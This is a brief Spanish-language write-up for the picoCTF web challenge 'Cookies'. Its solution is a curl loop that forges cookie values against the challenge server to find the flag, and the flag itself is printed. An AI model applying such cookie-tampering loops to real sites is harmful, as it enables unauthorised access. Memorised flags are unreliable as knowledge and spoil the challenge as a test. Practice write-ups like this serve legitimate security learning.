 
 **Reto:** Cookies

**Descripción:**
¿A quién no le encantan las galletas? Intenta descubrir cuál es la mejor. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)

**Solución:**
snickerdoodle
for i in {1..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i";done | grep picoCTF

==picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}==
**Notas adicionales:**

**Referencias:** 
https://youtu.be/LseQ-XWCXVo?si=-QPqR8zck1X7MMRL